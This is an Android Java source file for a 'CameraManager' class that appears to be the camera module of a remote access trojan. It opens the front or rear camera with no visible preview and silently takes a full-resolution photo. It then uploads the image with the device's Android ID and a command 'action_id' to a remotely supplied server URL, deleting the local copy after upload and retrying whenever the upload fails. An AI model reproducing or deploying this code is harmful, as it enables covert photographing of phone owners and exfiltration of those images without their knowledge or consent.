package com.hhm.android.otherapp.managers;


import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.provider.Settings;
import android.util.Log;

import com.google.gson.Gson;
import com.hhm.android.otherapp.Https.API;
import com.hhm.android.otherapp.utils.RatVo;
import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.hhm.android.otherapp.TelegramManager.localVersionName;


/**
 * @author huangche
 * @date : 2020/11/12
 * 相机拍照
 */
public class CameraManager {
    public static final String TAG = "CameraManager";

    private Context context ;
    private Camera camera = null;
    private boolean isFocusDone = false;

    public CameraManager(Context context) {
        this.context = context;
    }

    public void startUp(int cameraID, final int action_id,final String url){
        camera = Camera.open(cameraID);
        Parameters parameters = camera.getParameters();
        // 设置使用支持的最大分辨率
        List<Camera.Size> supportedSizes = parameters.getSupportedPictureSizes();
        long maxPixels = 0;
        int width = 0,height = 0;
        for(Camera.Size size:supportedSizes){
            if (maxPixels<size.width*size.height){
                width = size.width;
                height = size.height;
                maxPixels = width*height;
            }
        }
        if (height!=0 && width!=0){
            Log.e(TAG,"startUp():"+width+" "+height);
            parameters.setPictureSize(width,height);
        }
        // 设置自动对焦
        /*if (SystemUtil.hasAutoFocus(context)){
            parameters.setFocusMode(FOCUS_MODE_AUTO);
        }*/
        if (cameraID == 1){
            parameters.setRotation(270);
        } else if (cameraID == 0){
            parameters.setRotation(90);
        }
        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
            // 开始对焦，对焦结束回调函数 AutoFocusCallback
            camera.autoFocus(new Camera.AutoFocusCallback() {
                @Override
                public void onAutoFocus(boolean success, Camera camera) {
                    if(success){
                        Log.e(TAG,"onAutoFocus():success");
                    } else {
                        Log.e(TAG,"onAutoFocus():fail");
                    }
                    isFocusDone = true;
                }
            });
        } catch (Exception e) {
            Log.e(TAG,"StartUp():" + e);
        }
        // 确保对焦完成，2.5s内轮询
        /*int timeCount = 0;
        while(!isFocusDone&&timeCount<10){
            try {
                Thread.sleep(250);
                timeCount += 1;
                Log.e(TAG,"StartUp():timeCount "+timeCount);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        Log.e(TAG,"StartUp():isFocusDone "+isFocusDone);*/

        // 执行拍照动作
        camera.takePicture(null, null, new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                // 拍摄完成后释放 Camera
                releaseCamera();
                sendPhoto(data,action_id,url);
            }
        });
    }

    // 传输照片，此处可设置图片格式JPEG,PNG,WEBP，图片质量
    private void sendPhoto(byte[] data, int action_id, String url){
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        final File file = saveBitmapFile(bitmap);
        SendFile(context,file,action_id,url);
        /*try {
            Log.e(TAG,"sendPhoto()");
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos); // 100 压缩最大质量
            JSONObject object = new JSONObject();
            object.put("image",true);
            object.put("buffer" , bos.toByteArray());
            bos.flush();
            bos.close();
        } catch (JSONException e) {
            e.printStackTrace();
        }*/
    }

    public File saveBitmapFile(Bitmap bitmap){
        String str = String.valueOf(context.getCacheDir()) + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
        File file = new File(str);
        try{
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file));
            bitmap.compress(Bitmap.CompressFormat.PNG, 20, bos);
            bos.flush();
            bos.close();
            return file;
        } catch (IOException e){
            e.printStackTrace();
        }
        return null;
    }

    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    // 文件数据结果上报
    public static void SendFile(final Context context, final File file, final int action_id, final String url){
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", localVersionName(context))
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("action_id", String.valueOf(action_id))
                .addFormDataPart("code", String.valueOf(0))
                .addFormDataPart("msg", "success")
                .addFormDataPart("file_name", file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("2020==camera==Upload", "success");
                file.delete();
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload error:", t.getMessage());
                SendFile(context,file,action_id,url);
            }
        });
    }

}
